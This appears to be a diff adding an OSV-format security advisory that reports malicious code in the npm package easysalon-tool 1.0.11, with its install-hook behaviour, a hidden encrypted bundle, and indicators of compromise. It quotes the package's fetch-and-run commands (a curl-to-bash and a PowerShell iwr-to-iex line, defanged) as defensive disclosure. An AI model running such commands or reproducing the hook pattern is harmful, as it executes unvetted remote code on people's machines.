@@ -1,0 +1,72 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-13919",
+  "modified": "2026-11-11T08:17:04Z",
+  "published": "2026-11-11T08:16:04Z",
+  "summary": "Malicious code in easysalon-tool (npm)",
+  "details": "Easysalon-tool@1.0.11 executes remote code during npm install. Its postinstall hook (bin/postinstall.js) runs `curl -fsSL hxxps://antigravity[.]google/install[.]sh | bash` on Linux/macOS and `powershell -ExecutionPolicy Bypass -Command \"iwr -useb hxxps://antigravity[.]google/install[.]ps1 | iex\"` on Windows. The confirmation prompt that normally precedes it returns \"yes\" by default whenever stdin/stdout is not a TTY or the CI environment variable is set, so on CI/build machines the fetched script is piped straight into a shell with no interaction, no pinned version and no integrity or signature check. The same hook, and bin/cli.js on every launch, also silently run `npm install -g 9router` and `npm install -g @opencode/cli` (plus `winget install` / `brew install python3`), modifying the host's global packages from an install hook. The package also ships templates/agents.bundle.enc (300,558 bytes), AES-256-GCM ciphertext with an \"ESENC1\\0\" header, and the matching decryption key hardcoded in server/services/template_crypto.py (hash of a fixed passphrase). The bundle is unpacked at runtime into the developer's workspace as.agents/skills/ and GEMINI.md, so roughly 300KB of content is concealed from package review while remaining fully readable by the package itself. Additional surface: a local web dashboard bound to 0[.]0[.]0[.]0:8765 that spawns AI-agent shell sessions, a Telegram bot control channel keyed off TELEGRAM_BOT_TOKEN, and hardcoded default 9router API credentials. No credential-file harvesting (no.npmrc, NPM_TOKEN, GITHUB_TOKEN, ~/.ssh, ~/.aws or wallet paths) or persistence registration was found in the code reviewed. IOCs: hxxps://antigravity[.]google/install[.]sh, hxxps://antigravity[.]google/install[.]ps1, hxxps://registry[.]npmjs[.]org/easysalon-tool, hxxps://api[.]ipify[.]org, hxxps://ifconfig[.]me/ip, hxxps://icanhazip[.]com, hxxp://127[.]0[.]0[.]1:20128/v1 (local 9router proxy).",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "easysalon-tool",
+        "purl": "pkg:npm/easysalon-tool"
+      },
+      "versions": [
+        "1.0.11"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/easysalon-tool/v/1.0.11"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-13919"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-11-11T08:16:04Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "antigravity[.]google",
+          "icanhazip[.]com",
+          "ifconfig[.]me",
+          "registry[.]npmjs[.]org"
+        ],
+        "sha256": [
+          "0e06cb005e4f553abf9fbe32ee1e3b9265ac52e8a9703adcf6405e7c6d1529eb"
+        ],
+        "url_observed": [
+          "hxxps://antigravity[.]google/install[.]ps1",
+          "hxxps://antigravity[.]google/install[.]sh",
+          "hxxps://api[.]ipify[.]org",
+          "hxxps://icanhazip[.]com",
+          "hxxps://ifconfig[.]me/ip",
+          "hxxps://registry[.]npmjs[.]org/easysalon-tool"
+        ]
+      }
+    }
+  }
+}
